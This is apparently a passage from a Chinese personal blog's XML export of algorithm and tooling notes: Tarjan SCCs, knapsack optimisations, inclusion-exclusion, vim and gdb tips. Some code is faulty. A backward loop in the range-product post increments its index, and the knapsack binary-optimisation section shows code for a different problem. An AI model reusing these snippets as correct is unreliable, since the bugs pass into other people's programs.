class="built_in">tarjan</span>(v, u);</span><br><span class="line">      low[u] = <span class="built_in">min</span>(low[u], low[v]);</span><br><span class="line">      <span class="keyword">if</span> (low[v] &gt; dfn[u]) &#123;</span><br><span class="line">        isbridge[v] = <span class="literal">true</span>;</span><br><span class="line">        ++cnt_bridge;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (dfn[v] &lt; dfn[u] &amp;&amp; v != fa) &#123;</span><br><span class="line">      low[u] = <span class="built_in">min</span>(low[u], dfn[v]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="有向图中的tarjan算法">有向图中的tarjan算法</h1>
<h2 id="寻找强连通分量">1. 寻找强连通分量</h2>
<p>利用low数组和dst数组。dst表示按照dfs展开树访问顺序得到的时间标号，low数组表示当前节点通过反向边或者子树中节点通过反向边能到达的最早访问节点，注意一定是反向边，如果是横向边并不能得到一个环，只有反向边会得到环。由此可见，相同low值的点应该为一个强连通分量。</p>
<p><strong>注意low值并不是表示通过多个反向边到达的最早访问节点的编号值，而是当前节点和子节点只用一次反向边到达最早位置的值。</strong></p>
<figure>
<img src="low_dst.png" alt="low_dst" />
<figcaption aria-hidden="true">low_dst</figcaption>
</figure>
<p>dfs过程会产生一个dfs搜索树，当一个节点的low值小于dst值时，说明当前节点一定能访问到父节点，使得在dfs有向树中的节点与父节点之间的连通性可从有向边退化为无向边。</p>
<figure>
<img src="lian_tong_xing.png" alt="lian_tong_xing" />
<figcaption aria-hidden="true">lian_tong_xing</figcaption>
</figure>
<p>所以只要计算出节点的low、dst值和dfs搜索树。根据low与dst之间的大小关系，修改dfs搜索树中节点与父节点之间的联通关系。在代码中可以以dst
==
low的节点为分界点,从分界点到下一个子树中分界点之间的所有点可以视为一个强连通分量。示意图和代码如下：</p>
<figure>
<img src="dfs树和lowdst求解强连通分量的过程.png"
alt="红叉为dst = low的点，黄圈为强连通分量" />
<figcaption aria-hidden="true">红叉为dst =
low的点，黄圈为强连通分量</figcaption>
</figure>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> id[maxn],id_num;           <span class="comment">// 表示节点所属的</span></span><br><span class="line"><span class="type">int</span> low[maxn],dst[maxn],now_time;</span><br><span class="line">stack&lt;<span class="type">int</span>&gt;s;</span><br><span class="line"><span class="type">int</span> vis[maxn];  <span class="comment">// 表示是否访问完毕，用于</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> now_posi)</span></span>&#123;     <span class="comment">// 由于是有向图，所以方向边可以指向父节点，所以这里不用记录父节点进行过滤</span></span><br><span class="line">    low[now_posi] = dst[now_posi] = now_time++;</span><br><span class="line">    vis[now_posi] = <span class="number">-1</span>;</span><br><span class="line">    s.<span class="built_in">push</span>(now_posi);       <span class="comment">// 保存了先序遍历的顺序，此时后方节点中使用的</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; G[now_posi].<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">        <span class="type">int</span> next_posi = G[now_posi][i];</span><br><span class="line">        <span class="keyword">if</span>(vis[next_posi] == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">dfs</span>(next_posi);</span><br><span class="line">            low[now_posi] = <span class="built_in">min</span>(low[now_posi],low[next_posi]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(vis[next_posi] == <span class="number">-1</span>)&#123;   <span class="comment">//反向边</span></span><br><span class="line">            low[now_posi] = <span class="built_in">min</span>(low[now_posi],dst[next_posi]);          </span><br><span class="line">            <span class="comment">// 我试过这句话也可</span></span><br><span class="line">            <span class="comment">// low[now_posi] = min(low[now_posi],low[next_posi]);          </span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(vis[next_posi] == <span class="number">1</span>)&#123;    <span class="comment">// 横向边不做任何处理</span></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    vis[now_posi] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(low[now_posi] == dst[now_posi])&#123;</span><br><span class="line">        <span class="keyword">while</span>(!s.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="type">int</span> top_value = s.<span class="built_in">top</span>();</span><br><span class="line">            s.<span class="built_in">pop</span>();</span><br><span class="line">            id[top_value] = id_num;     <span class="comment">// 相同id的为一个联通分量</span></span><br><span class="line">            <span class="keyword">if</span>(top_value == now_posi)<span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        id_num++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>tarjan算法</tag>
      </tags>
  </entry>
  <entry>
    <title>vim使用技巧</title>
    <url>/2023/11/18/vim%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<h1
id="将缓冲区的内容视为命令使用特殊解释器来处理">将缓冲区的内容视为命令,使用特殊解释器来处理</h1>
<p>直接选中缓冲区区域，使用<code>w !bash</code>，即可将缓冲区的命令在bash中执行。<br />
1. <code>w !bash</code>可以处理下面内容 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo 2</span><br></pre></td></tr></table></figure> 2.
<code>w !python</code>可以处理下面内容 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i in range(10):</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure></p>
<p>如果只有<code>!</code>和<code>解释器</code>，那么会出现将内容替换为执行后的结果。</p>
<p><strong>注意<code>w</code>与<code>!</code>中间的空格，如果不加怎会将当前选中的内容保存为<code>!</code>后面的名字的文件</strong></p>
<ol start="3" type="1">
<li>一些优秀的配置
https://wklken.me/posts/2016/02/03/some-vim-configs.html</li>
</ol>
<h2 id="netrw使用技巧">netrw使用技巧</h2>
<ol type="1">
<li><p><code>:e filename</code>可以增加文件</p></li>
<li><p>文件使用<code>o</code>将文件与netrw进行横向分屏，<code>v</code>将文件与netrw纵向分屏，<code>p</code>预览文件同时光标在netrw上，此时使用<code>C-W c</code>即可关闭预览文件。</p></li>
<li><p>回车也可以打开一个文件，此时使用<code>C-o</code>即可回到netrw处。</p></li>
<li><p>i键可以改变目录排列风格</p></li>
<li><p><C-a>和<C-leader>的作用 重复上一次的插入</p></li>
</ol>
<h2 id="跳转">跳转</h2>
<ol type="1">
<li>gx可以跳转到一些网页</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>vim切换normal模式下的中英文切换</title>
    <url>/2024/05/27/vim%E5%88%87%E6%8D%A2normal%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E4%B8%AD%E8%8B%B1%E6%96%87%E5%88%87%E6%8D%A2/</url>
    <content><![CDATA[<p>#　vim插件可以实现切换到normal模式和其他模式时的中英文自动切换</p>
<p><a href="https://github.com/h-youhei/vim-ibus">插件地址</a></p>
<p>nvim中使用<code>use("h-youhei/vim-ibus")</code>将插件安装,之后在配置中使用
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">let g:ibus#layout = <span class="string">&#x27;xkb:us::eng&#x27;</span></span><br><span class="line">let g:ibus#engine = <span class="string">&#x27;rime&#x27;</span>          </span><br></pre></td></tr></table></figure> g:ibus#engine的值使用<code>ibus engine</code>可以得到</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(homework)</span><br><span class="line">skt1faker@nwpu ~/website/notebook/source/_drafts</span><br><span class="line">master* $ ibus engine                                                      [11:36:32]</span><br><span class="line">xkb:us::eng</span><br><span class="line"></span><br><span class="line">(homework)</span><br><span class="line">skt1faker@nwpu ~/website/notebook/source/_drafts</span><br><span class="line">master* $ ibus engine                                                      [11:36:37]</span><br><span class="line">rime</span><br></pre></td></tr></table></figure>
<p>两个命令前后是我切换输入法的结果。</p>
]]></content>
      <tags>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title>任意区间连乘计算陷阱</title>
    <url>/2023/11/11/%E4%BB%BB%E6%84%8F%E5%8C%BA%E9%97%B4%E8%BF%9E%E4%B9%98%E8%AE%A1%E7%AE%97%E9%99%B7%E9%98%B1/</url>
    <content><![CDATA[<h1 id="题意">题意</h1>
<p>对于任意值<span class="math inline">\(a_i, (i \in
[1,n])\)</span>，计算任意区间<span
class="math inline">\([l,r]\)</span>的值<span
class="math inline">\(f(l,r) = \prod_{i = l}^{r}a_i\)</span>。</p>
<h1 id="题解">题解</h1>
<p>最先能想到的就是令<span class="math inline">\(A_i = \prod_{j =
1}^{i}a_{j}\)</span>，于是<span class="math inline">\(f(l,r) = A_r /
A_{l - 1}\)</span>，但是，看到除法我们可以想到一种可能得情况，就是<span
class="math inline">\(A_{l - 1} == 0\)</span>时，这时<span
class="math inline">\(A_r ==
0\)</span>也应该是成立的，所以这就相当于求极限了，所以使用上述表达式还不能求出连乘。</p>
<p>解决上述问题的方法是将0替换为一个不为0的数即可（常用1）。通过多余的数组计算l的左侧第一个0的位置，用于判断<span
class="math inline">\(f(l,r)\)</span>的值是否为0，如果不为0，那么直接使用<span
class="math inline">\(f(l,r) = A_r / A_{l -
1}\)</span>进行计算即可，否则直接输出0就行。</p>
<p>现给出不完整的代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">int</span> A[maxx];</span><br><span class="line"><span class="type">int</span> a[maxx];</span><br><span class="line"><span class="type">int</span> rposi[maxx];</span><br><span class="line">A[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i &lt;= n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i] == <span class="number">0</span>)&#123;</span><br><span class="line">            A[i] = A[i - <span class="number">1</span>] * <span class="number">1</span>;</span><br><span class="line">            rposi[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            A[i] = A[i - <span class="number">1</span>] * a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    rposi[n + <span class="number">1</span>] = n + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = n;i&gt;=<span class="number">1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i] == <span class="number">0</span>)&#123;</span><br><span class="line">            rposi[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            rposi[i] = rposi[i + <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">f</span><span class="params">(<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(rposi[l] &lt;= r)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> A[r] / A[l - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title>任务</title>
    <url>/2024/03/18/%E4%BB%BB%E5%8A%A1/</url>
    <content><![CDATA[<ol type="1">
<li>https://www.lanqiao.cn/problems/2128/learning/</li>
<li>https://www.lanqiao.cn/problems/2127/learning/</li>
<li>https://www.luogu.com.cn/problem/P1525</li>
<li>https://vjudge.net/problem/HDU-3038#author=GPT_zh</li>
<li>Dinic网络流</li>
<li>https://www.lanqiao.cn/paper/</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>完全背包和有限背包的优化</title>
    <url>/2024/08/31/%E5%AE%8C%E5%85%A8%E8%83%8C%E5%8C%85%E5%92%8C%E5%A4%9A%E9%87%8D%E8%83%8C%E5%8C%85%E7%9A%84%E4%BC%98%E5%8C%96/</url>
    <content><![CDATA[<h1 id="有限背包的优化">有限背包的优化</h1>
<p>有限背包的朴素做法是：</p>
<p><span class="math display">\[
dp[i][j] = max_{num[i]&gt;=k&gt;=0 \&amp; j - k * w[i] &gt;=
0}(dp[i][j], dp[i - 1][j - k * w[i]] + k * v[i])
\]</span> 其中<span
class="math inline">\(dp[i][j]\)</span>表示前i种物品使用体积j能装的最大价值，<span
class="math inline">\(num[i]\)</span>表示第i个物品数量，<span
class="math inline">\(w[i]\)</span>表示体积，<span
class="math inline">\(v[i]\)</span>表示价值。可以看到，时间复杂度为<span
class="math inline">\(O(nW \times
num)\)</span>，num[i]过大时需要优化。</p>
<p>有限背包优化有两种方案
<code>1. 二进制优化 2. 单调队列</code>，先介绍二进制优化</p>
<h2 id="数的分解">数的分解</h2>
<p>这里先介绍一个规律，然后再利用这个规律进行优化</p>
<p>规律1：将数字<code>A</code>进行如下的二进制分解得到一组数，这组数通过组合可以得到<span
class="math inline">\([0,A]\)</span>中所有的数。 <span
class="math display">\[
\begin{align*} a_{1} &amp;= 1 \\ a_{2} &amp;= 2 \\ a_{3} &amp;= 2 ^ {3 -
1} \\ &amp;.\\ &amp;.\\ &amp;.\\a_{k - 1} &amp;= 2 ^ {k - 2} \\ a_{k}
&amp;= A - (2 ^ {k - 1} - 1)
\\ 2^{k-1} - 1 &amp;&lt;= A &lt;= 2^{k}
\end{align*}
\]</span></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> A;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;A);</span><br><span class="line"><span class="type">int</span> now_value = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> a[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">while</span>(A)&#123;</span><br><span class="line">    <span class="keyword">if</span>(A &lt;= now_value) now_value = A;</span><br><span class="line">    A -= now_value;</span><br><span class="line">    a[cnt] = now_value;</span><br><span class="line">    cnt++;</span><br><span class="line">    now_value *= <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以简单的证明<span
class="math inline">\(a_{i}\)</span>的组合可以得到<span
class="math inline">\([0,A]\)</span>。按照程序可知<span
class="math inline">\(a_{k} &lt; 2^{k - 1}\)</span>，否则<span
class="math inline">\(a_{k}\)</span>可继续行向下二进制分解。因为<span
class="math inline">\(\sum_{i = 1}^{k - 1}a_{i} = 2^{k - 1} -
1\)</span>，所以前k - 1个数的自由组合可得到<span
class="math inline">\([0,2^{k - 1} - 1]\)</span>, 也即小于等于<span
class="math inline">\(a_{k}\)</span>的所有数都可以表示，而<span
class="math inline">\([a_{k},A]\)</span>范围可以视为<span
class="math inline">\(a_{k} + [0,2^{k - 1} -
1]\)</span>，即可用一个<span class="math inline">\(a_{k}\)</span>和<span
class="math inline">\(a_{1}...a_{k -
1}\)</span>中的数自由组合表示出所有的数。</p>
<p>利用规律一可以将有限背包转换为0/1背包，将有限背包中物品数量使用上述方式分解。</p>
<h2 id="二进制优化">二进制优化</h2>
<p>利用上述二进制分解的方式，将背包物品数量A分解为<span
class="math inline">\(a_{1},a_{2}......a_{k}\)</span>，可以知道，通过抽取集合<span
class="math inline">\({a_{1},a_{2},...,a_{k}}\)</span>中数字并求和可以得到<span
class="math inline">\([0,A]\)</span>之间的数字。利用这个原理，可以讲有限背包拆分为0/1背包，即拆分出体积为<span
class="math inline">\(a_{1},a_{2},...,a_{k}\)</span>的物品，将其视为一个整体。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*================================================================</span></span><br><span class="line"><span class="comment">*   Copyright (C) 2024 Wang XinPeng. All rights reserved.</span></span><br><span class="line"><span class="comment">*   </span></span><br><span class="line"><span class="comment">*   filename:     p4141.cpp</span></span><br><span class="line"><span class="comment">*   username:     skt1faker</span></span><br><span class="line"><span class="comment">*   create time:  14:46  2024.08.25</span></span><br><span class="line"><span class="comment">*   modify time:  14:46  2024.08.25</span></span><br><span class="line"><span class="comment">*   email:        skk1faker@163.com</span></span><br><span class="line"><span class="comment">*   descripe:     </span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">================================================================*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> lll __int128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEBUG0</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod1 = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod2 = <span class="number">998244353</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxx = <span class="number">2e3</span> + <span class="number">10</span>;</span><br><span class="line">ll dp[maxx], a[maxx], num[maxx],dp2[maxx];			<span class="comment">// </span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> n,m;</span><br><span class="line">	cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;a[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j = m;j &gt;= <span class="number">0</span>;j--)&#123;</span><br><span class="line">			<span class="keyword">if</span>(j - a[i] &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">				dp[j] += dp[j - a[i]];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>;j &lt;= m;j++)&#123;</span><br><span class="line">			dp2[j] = dp[j];</span><br><span class="line">			<span class="keyword">if</span>(j - a[i] &gt;= <span class="number">0</span>)dp2[j] = dp[j] - dp2[j - a[i]];</span><br><span class="line">			<span class="keyword">if</span>(j &gt; <span class="number">0</span>)cout&lt;&lt;dp2[j] %<span class="number">10</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		cout&lt;&lt;endl;</span><br><span class="line">	&#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="滑动窗口优化">滑动窗口优化</h2>
<p>从朴素的做法中可以看出，<br />
<span class="math display">\[
\begin{cases}
dp[i][j] &amp;= max(dp[i - 1][j], dp[i - 1][j - w[i]] + v[i], dp[i -
1][j - 2 w[i]] + 2v[i] , ... ,dp[i - 1][j - num[i] * w[i]] + num[i] *
v[i])
\\dp[i][j - w[i]] &amp;= max(dp[i - 1][j - w[i]] + v[i], dp[i - 1][j - 2
* w[i]] + 2 * v[i], dp[i - 1][j - 3 * w[i]] + 3 * v[i] , ... ,dp[i -
1][j - (num[i] + 1) * w[i]] + (num[i] + 1) * v[i]) - v[i]
\\dp[i][j - 2w[i]] &amp;= max(dp[i - 1][j - 2w[i]] + 2v[i], dp[i - 1][j
- 3 * w[i]] + 3 * v[i], dp[i - 1][j - 4 * w[i]] + 4 * v[i] , ... ,dp[i -
1][j - (num[i] + 2) * w[i]] + (num[i] + 2) * v[i]) - 2v[i]
\end{cases}
\]</span></p>
<p>可以看出取最值的位置是一个滑窗，可将体积<span class="math inline">\(j
% w[i]\)</span>的分为一组做滑窗处理。</p>
<figure>
<img src="slide_windows.png" alt="滑窗过程" />
<figcaption aria-hidden="true">滑窗过程</figcaption>
</figure>
<h1 id="完全背包优化">完全背包优化</h1>
<p>完全背包的优化类似于有限背包的滑窗过程，可通过表达式推倒。</p>
<p><span class="math display">\[
\begin{cases}
dp[i][j] &amp;= max(dp[i - 1][j],dp[i - 1][j - w[i]] + v[i] .... dp[i -
1][j \% w[i]] + round(\frac{j}{w[i]}) * v[i])
\\&amp;= max(dp[i - 1][j], max(dp[i - 1][j - w[i]], dp[i - 1][j - 2w[i]]
+ v[i],...,dp[i - 1][j \% w[i]] + (round(\frac{j}{w[i]} - 1)) * v[i]) +
v[i])
\\&amp;= max(dp[i - 1][j] + dp[i][j - w[i]] + v[i])
\end{cases}
\]</span></p>
<p>最终可得</p>
<p><span class="math display">\[
dp[i][j] = max(dp[i - 1][j], dp[i][j - w[i]] + v[i]);
\]</span></p>
<h1 id="参考">参考</h1>
<p><a
href="https://web.ntnu.edu.tw/~algo/KnapsackProblem.html">多种背包</a></p>
]]></content>
      <tags>
        <tag>背包</tag>
      </tags>
  </entry>
  <entry>
    <title>容斥原理</title>
    <url>/2024/05/08/%E5%AE%B9%E6%96%A5%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<p># 容斥原理定义</p>
<p>现有k个条件<span
class="math inline">\(f_{1},f_{2}...f_{k}\)</span>，现求满足任意一个条件的元素数量（注意不是同时满足上述条件，而是满足任意一个条件的元素数量）</p>
<p>使用我文氏图表示如下：</p>
<figure>
<img src="wenshitu.png" alt="wenshitu" />
<figcaption aria-hidden="true">wenshitu</figcaption>
</figure>
<h1 id="求解方法">求解方法</h1>
<p><span class="math display">\[
\begin{aligned}
\left|\bigcup_{i=1}^{n} f_{i}\right|= &amp;
\sum_{i}\left|f_{i}\right|-\sum_{i&lt;j}\left|f_{i} \cap
f_{j}\right|+\sum_{i&lt;j&lt;k}\left|f_{i} \cap f_{j} \cap
f_{k}\right|-\cdots \\&amp; +(-1)^{m-1}
\sum_{a_{i}&lt;a_{i+1}}\left|\bigcap_{i=1}^{m}
f_{a_{i}}\right|+\cdots+(-1)^{n-1}\left|f_{1} \cap \cdots \cap
f_{n}\right|
\end{aligned}
\]</span></p>
<p>可以看到集合的并是通过集合交集不断的运算得出的。最开始计算满足一个条件的元素数量的和，其中同时满足两个条件的集合数量会被多次计算，需要减去。减去时会多减去一些同时满足三个条件的集合数量....。以上是语言上的证明，现在给出数学上的证明。</p>
<p>假设元素x满足条件<span
class="math inline">\(f_1,f_2,f_3...f_{s}\)</span>，分析上述等式。<span
class="math inline">\(\sum_{i}|f_{i}|\)</span>中x会被计算<span
class="math inline">\(C_{s}^{1}\)</span>次，<span
class="math inline">\(-\sum_{i&lt;j}|f_{i} \cap
f_{j}|\)</span>中x会被计算$ - C_{s}^{2}$, <span
class="math inline">\(\sum_{i&lt;j&lt;k}|f_{i} \cap f_{j} \cap
f_{k}|\)</span>中x会被计算<span
class="math inline">\(C_{s}^{3}\)</span>次，依此类推，求解式中计算次数为</p>
<p><span class="math display">\[
\begin{matrix}
\sum_{i = 1}^{s} (-1)^{i - 1} C_{s}^{i} &amp;=&amp; C_{s}^{0} - \sum_{i
= 0}^{s} (-1)^{i} C_{s}^{i}
\\ &amp;=&amp; C_{s}^{0} - (1 - 1) ^ s
\\ &amp;=&amp; 1
\end{matrix}
\]</span> 可见x在集合求解表达式中计算次数为1。</p>
<h1 id="集合的交如何求解">集合的交如何求解</h1>
<p>由于交和并可以转化，容斥原理可以通过<span
class="math inline">\(\bigcap_{i = 1}^{k}f_{i} = U - \bigcup_{i = 1}^{k}
\bar{f_{i}}\)</span>将交集转化为全集U和条件f非的并集之间的计算，对并集使用容斥原理，即可完成交集的运算。</p>
<h1 id="参考">参考</h1>
<p><a
href="https://oi-wiki.org/math/combinatorics/inclusion-exclusion-principle/">参考文献</a></p>
]]></content>
      <tags>
        <tag>数学</tag>
        <tag>acm</tag>
      </tags>
  </entry>
  <entry>
    <title>多进程调试</title>
    <url>/2024/03/27/%E5%A4%9A%E8%BF%9B%E7%A8%8B%E8%B0%83%E8%AF%95/</url>
    <content><![CDATA[<h1 id="参考">参考</h1>
<p><a
href="https://blog.csdn.net/gatieme/article/details/78309696">参考文献</a></p>
<h1 id="思路">思路</h1>
<p>调试中，如不做多余操作，fork的进程在调试中会一直跑到结束，无法停止，并且打断点后子进程到达断点位置会收到sigtrap信号并终止。</p>
<p>在gdb7.0后存在几种选项，方便进程调试。</p>
<ol type="1">
<li><p><code>follow-fork-mode</code>，表示调试中遇到fork之后，gdb继续跟踪当前进程还是子进程。<code>child</code>表示跟踪子进程，<code>parent</code>表示跟踪当前进程</p></li>
<li><p><code>detach-on-fork</code>，表示调试中fork后的进程是否阻塞。<code>on</code>表示不阻塞，<code>off</code>表示阻塞</p></li>
</ol>
<h1 id="命令">命令</h1>
<ol type="1">
<li><p>调试开始时可设置 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set follow-fork-mode parent</span><br><span class="line">set detach-on-fork off</span><br></pre></td></tr></table></figure>
或在<code>~/.gdbinit</code>中设置如下选项 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># set follow-fork-mode parent   表示fork后跟踪哪个进程,parent还是child子进程</span><br><span class="line"># set detach-on-fork off        off表示未跟踪的进程会在fork处阻塞</span><br></pre></td></tr></table></figure></p></li>
<li><p>使用<code>info inferiors</code>可查看进程数量 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) info inferiors </span><br><span class="line">  Num  Description       Executable        </span><br><span class="line">* 1    process 309190    /home/skt1faker/my_procedure/money/2024/3.23/a.out </span><br><span class="line">  2    process 309200    /home/skt1faker/my_procedure/money/2024/3.23/a.out </span><br><span class="line">  3    process 309201    /home/skt1faker/my_procedure/money/2024/3.23/a.out </span><br><span class="line">  4    process 309202    /home/skt1faker/my_procedure/money/2024/3.23/a.out </span><br><span class="line">  5    process 309216    /home/skt1faker/my_procedure/money/2024/3.23/a.out </span><br><span class="line">  6    process 309236    /home/skt1faker/my_procedure/money/2024/3.23/a.out </span><br><span class="line">  7    process 309237    /home/skt1faker/my_procedure/money/2024/3.23/a.out </span><br><span class="line">(gdb) </span><br></pre></td></tr></table></figure>
<code>*</code>表示当前进程位置</p></li>
<li><p><code>inferiors id</code>可以切换进程，如下所示。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) inferior 4</span><br><span class="line">[Switching to inferior 4 [process 309202] (/home/skt1faker/my_procedure/money/2024/3.23/a.out)]</span><br><span class="line">[Switching to thread 4.1 (process 309202)]</span><br><span class="line"><span class="comment">#0  arch_fork (ctid=0x7ffff7d77a10) at ../sysdeps/unix/sysv/linux/arch-fork.h:49</span></span><br><span class="line">49      ../sysdeps/unix/sysv/linux/arch-fork.h: No such file or directory.</span><br><span class="line">(gdb) info inferiors </span><br><span class="line">  Num  Description       Executable        </span><br><span class="line">  1    process 309190    /home/skt1faker/my_procedure/money/2024/3.23/a.out </span><br><span class="line">  2    process 309200    /home/skt1faker/my_procedure/money/2024/3.23/a.out </span><br><span class="line">  3    process 309201    /home/skt1faker/my_procedure/money/2024/3.23/a.out </span><br><span class="line">* 4    process 309202    /home/skt1faker/my_procedure/money/2024/3.23/a.out </span><br><span class="line">  5    process 309216    /home/skt1faker/my_procedure/money/2024/3.23/a.out </span><br><span class="line">  6    process 309236    /home/skt1faker/my_procedure/money/2024/3.23/a.out </span><br><span class="line">  7    process 309237    /home/skt1faker/my_procedure/money/2024/3.23/a.out </span><br><span class="line">(gdb) </span><br></pre></td></tr></table></figure>
其中的<code>*</code>表示当前进程为止，可见已经切换到4号进程了。</p></li>
</ol>
]]></content>
      <tags>
        <tag>gdb</tag>
      </tags>
  </entry>
  <entry>
    <title>并查集</title>
    <url>/2024/03/13/%E5%B9%B6%E6%9F%A5%E9%9B%86/</url>
    <content><![CDATA[<h1 id="蓝桥杯-2022-省-a-推导部分和">[蓝桥杯 2022 省 A] 推导部分和</h1>
<h2 id="题目描述">题目描述</h2>
<p>对于一个长度为 <span class="math inline">\(N\)</span> 的整数数列
<span class="math inline">\(A_{1}, A_{2}, \cdots
A_{N}\)</span>，小蓝想知道下标 <span class="math inline">\(l\)</span> 到
<span class="math inline">\(r\)</span> 的部分和 <span
class="math inline">\(\sum\limits_{i=l}^{r}A_i=A_{l}+A_{l+1}+\cdots+A_{r}\)</span>
是多少?</p>
<p>然而，小蓝并不知道数列中每个数的值是多少，他只知道它的 <span
class="math inline">\(M\)</span> 个部分和的值。其中第 <span
class="math inline">\(i\)</span> 个部分和是下标 <span
class="math inline">\(l_{i}\)</span> 到 <span
class="math inline">\(r_{i}\)</span> 的部分和 <span
class="math inline">\(\sum_{j=l_{i}}^{r_{i}}=A_{l_{i}}+A_{l_{i}+1}+\cdots+A_{r_{i}}\)</span>,
值是 <span class="math inline">\(S_{i}\)</span> 。</p>
<h2 id="输入格式">输入格式</h2>
<p>第一行包含 3 个整数 <span class="math inline">\(N 、 M\)</span> 和
<span
class="math inline">\(Q\)</span>。分别代表数组长度、已知的部分和数量
和询问的部分和数量。</p>
<p>接下来 <span class="math inline">\(M\)</span> 行，每行包含 <span
class="math inline">\(3\)</span> 个整数 <span
